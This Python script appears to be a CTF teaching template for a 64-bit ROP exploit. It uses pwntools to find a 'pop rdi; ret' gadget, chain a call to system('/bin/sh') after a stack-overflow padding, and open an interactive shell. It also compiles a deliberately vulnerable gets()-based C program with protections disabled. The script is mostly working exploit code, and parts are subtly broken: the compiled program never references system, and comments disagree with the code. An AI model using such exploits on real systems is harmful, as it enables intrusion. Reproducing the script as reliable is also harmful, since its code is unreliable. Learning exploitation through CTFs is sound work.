#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# This script is a template for finding ROP gadgets and building a ROP chain
# for a 64-bit binary. It assumes you have `pwntools` installed.
# To install pwntools: pip install pwntools
# It also assumes you have the 'ROPgadget' tool installed and available in your PATH.
# To install ROPgadget: pip install ropgadget

from pwn import *

# ==============================================================================
#  CONFIGURATION
# ==============================================================================

# Set the context for the target architecture.
# Use 'amd64' for 64-bit, 'i386' for 32-bit.
context.arch = 'amd64'

# Set the path to the vulnerable binary.
# You can replace this with the path to the CTF challenge binary.
BINARY_PATH = './vulnerable_binary'

# If the binary is a remote target, uncomment and configure these lines.
# HOST = 'target.ctf.com'
# PORT = 12345

# ==============================================================================
#  MAIN EXPLOIT LOGIC
# ==============================================================================

def exploit():
    """
    Main function to orchestrate the ROP attack.
    """
    try:
        # Create a process for the binary.
        # Use `remote(HOST, PORT)` for remote targets.
        p = process(BINARY_PATH)

        log.info("Starting exploit for {}".format(BINARY_PATH))

        # Load the binary and create a ROP object.
        # Pwntools will automatically run ROPgadget to find gadgets.
        elf = ELF(BINARY_PATH)
        rop = ROP(elf)

        # Print some useful addresses.
        log.info(f"Target binary loaded at base address: {hex(elf.address)}")
        log.info(f"Address of `main`: {hex(elf.symbols['main'])}")
        
        # You can search for specific gadgets.
        # This will find a "pop rdi ; ret" gadget, which is essential for x86-64 calling conventions.
        # The `pwntools` library uses an external tool (like `ROPgadget`) to perform this search.
        pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])
        if pop_rdi_ret:
            log.success(f"Found 'pop rdi; ret' gadget at: {hex(pop_rdi_ret.address)}")
        else:
            log.error("Could not find a 'pop rdi; ret' gadget. ROP chain will likely fail.")
            p.close()
            return
            
        # Example ROP chain to call `system('/bin/sh')`.
        # This is the "Hello World" of ROP.
        # We need to find the address of the `system` function and the string `"/bin/sh"`.
        # For statically linked binaries, these will be in the ELF file.
        # For dynamically linked binaries, you might need to leak a libc address first.
        
        # In this example, we assume we've already found the address of a `/bin/sh` string.
        # A common technique is to search for it in the binary's data sections.
        # If not present, you'd need to write it to a writable memory segment.
        try:
            bin_sh = next(elf.search(b'/bin/sh'))
            log.success(f"Found '/bin/sh' string at: {hex(bin_sh)}")
        except StopIteration:
            log.error("Could not find '/bin/sh' string in the binary.")
            p.close()
            return
        
        # Here we build the ROP chain.
        # A ROP chain is simply a list of addresses to overwrite the stack with.
        # The `rop` object from pwntools helps us build this easily.
        chain = ROP(elf)
        
        # Step 1: Pop the address of '/bin/sh' into the RDI register.
        # The `call` method can be used to add a call to a function with arguments.
        # `chain.call('function_name', [arg1, arg2])`
        # In this case, we use `rop.raw(pop_rdi_ret.address)` to add the gadget address.
        # Then, we use `rop.raw(bin_sh)` to add the value to be popped into rdi.
        # Note: A more modern and robust way is to use `rop.system(bin_sh)`.
        
        # Let's use the standard method to be explicit about the gadgets.
        chain.raw(pop_rdi_ret.address)  # First gadget: pop /bin/sh into rdi
        chain.raw(bin_sh)               # Address of '/bin/sh'
        
        # Step 2: Call the `system` function.
        chain.raw(elf.symbols['system'])
        
        # Now, print the constructed chain.
        log.info("Constructed ROP chain:")
        print(chain.dump())
        
        # The padding needed to overwrite the saved RIP (Return Instruction Pointer).
        # This is a crucial part of a buffer overflow. You must determine this offset
        # for the specific binary.
        # In a real CTF, you'd find this with gdb/gef or by fuzzing.
        PADDING_SIZE = 104 # Example padding size
        
        # Construct the final payload.
        # Padding + ROP chain.
        payload = b"A" * PADDING_SIZE + chain.chain()
        
        log.info("Sending payload...")
        p.sendline(payload)
        
        # The exploit should now have executed `system('/bin/sh')`.
        # Drop to an interactive shell to interact with the spawned shell.
        p.interactive()

    except Exception as e:
        log.error("An error occurred: {}".format(e))
    finally:
        p.close()


if __name__ == '__main__':
    # This example requires a binary to run against.
    # We will create a dummy file for demonstration purposes.
    # In a real scenario, you would have a vulnerable binary from the CTF.
    if not os.path.exists(BINARY_PATH):
        log.warning(f"Dummy binary '{BINARY_PATH}' not found. Creating it...")
        # A simple C code snippet for a vulnerable program.
        c_code = """
        #include <stdio.h>
        #include <string.h>
        #include <unistd.h>

        void vuln() {
            char buf[100];
            printf("Enter your input: ");
            gets(buf);
            printf("You entered: %s\\n", buf);
        }

        void main() {
            setbuf(stdout, NULL);
            setbuf(stdin, NULL);
            setbuf(stderr, NULL);
            vuln();
        }
        """
        # Compile the C code with mitigations disabled for the example.
        # '-m32' for 32-bit, '-m64' for 64-bit.
        # '-no-pie' disables Position Independent Executable.
        # '-fno-stack-protector' disables stack canaries.
        # `-z execstack` makes the stack executable (not needed for ROP, but helpful for shellcode).
        # We need a `system` function and `/bin/sh` string for the ROP chain to work.
        # Linking against libc is a good way to get those.
        with open('vuln.c', 'w') as f:
            f.write(c_code)
        
        # Command to compile a 64-bit binary.
        compile_command = f"gcc vuln.c -o {BINARY_PATH} -m64 -fno-stack-protector -no-pie -z execstack -lc -g"
        os.system(compile_command)
        log.success(f"Dummy binary '{BINARY_PATH}' created.")

    exploit()
